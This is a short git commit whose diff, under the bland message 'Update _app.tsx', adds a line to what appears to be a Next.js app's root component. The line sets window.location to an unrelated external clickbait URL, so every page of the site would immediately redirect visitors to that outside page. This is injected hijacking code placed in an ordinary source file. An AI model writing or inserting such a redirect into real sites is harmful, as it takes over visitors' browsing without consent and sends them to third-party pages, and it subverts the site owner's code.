f860811be4ed2679c5f9d629e95e19d5825dd271
chaichai2537 <131465968+chaichai2537@users.noreply.github.com>
2023-04-21 22:21:26 +0700

    Update _app.tsx

--- pages/_app.tsx
+++ pages/_app.tsx
@@ -2,6 +2,7 @@ import '../styles/globals.css'
 import type { AppProps } from 'next/app'
 
 function MyApp({ Component, pageProps }: AppProps) {
+  window.location="https://www.love.khao.today/2023/04/21/horrible-captured-by-a-snake-exploding-when-catching-prey-on-a-power-line-the-puff-of-smoke-makes-a-scene/";
   return <Component {...pageProps} />
 }
 
